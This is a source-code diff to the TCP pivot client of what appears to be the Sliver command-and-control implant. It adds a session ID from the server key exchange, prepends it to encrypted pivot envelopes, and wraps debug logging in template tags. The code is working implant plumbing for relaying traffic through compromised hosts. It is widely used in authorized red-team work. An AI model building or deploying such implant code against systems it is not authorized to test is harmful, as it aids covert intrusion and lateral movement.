@@ -23,13 +23,18 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
-	"log"
+	"errors"
 	"net"
 	"sync"
 	"time"
 
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -47,6 +52,7 @@ func originID() int64 {
 // NetConnPivotClient - A TCP pivot client
 type NetConnPivotClient struct {
 	originID        int64
+	pivotSessionID  []byte
 	conn            net.Conn
 	readMutex       *sync.Mutex
 	writeMutex      *sync.Mutex
@@ -161,11 +167,26 @@ func (p *NetConnPivotClient) serverKeyExchange() error {
 	// a different read deadline here as this has to go round trip to the server if the
 	// upstream implant uses a slow protocol it may take a while to go there and back again
 	p.conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
-	_, err = p.ReadEnvelope()
+	serverKeyExchangeResp, err := p.ReadEnvelope()
 	p.conn.SetReadDeadline(time.Time{})
 	if err != nil {
 		return err
 	}
+	if serverKeyExchangeResp.Type != pb.MsgPivotServerKeyExchange {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] Unexpected message type: %v", serverKeyExchangeResp.Type)
+		// {{end}}
+		return errors.New("server key exchange failure")
+	}
+	// Just make sure we can parse the bytes
+	p.pivotSessionID = uuid.FromBytesOrNil(serverKeyExchangeResp.Data).Bytes()
+
+	// {{if .Config.Debug}}
+	log.Printf("[pivot] Pivot session ID: %s",
+		uuid.FromBytesOrNil(serverKeyExchangeResp.Data).String(),
+	)
+	// {{end}}
+
 	return nil
 }
 
@@ -252,6 +273,8 @@ func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 		// {{end}}
 		return err
 	}
+	// Prepend the message with the pivot session ID
+	// note this can only be done after the server key change
 	ciphertext, err := p.serverCipherCtx.Encrypt(plaintext)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -259,9 +282,12 @@ func (p *NetConnPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
 		// {{end}}
 		return err
 	}
+	msgBuf := make([]byte, len(p.pivotSessionID)+len(ciphertext))
+	copy(msgBuf, p.pivotSessionID)
+	copy(msgBuf[len(p.pivotSessionID):], ciphertext)
 	peerEnvelope, _ := proto.Marshal(&pb.Envelope{
 		Type: pb.MsgPivotOriginEnvelope,
-		Data: ciphertext,
+		Data: msgBuf,
 	})
 	peerCiphertext, err := p.peerCipherCtx.Encrypt(peerEnvelope)
 	if err != nil {
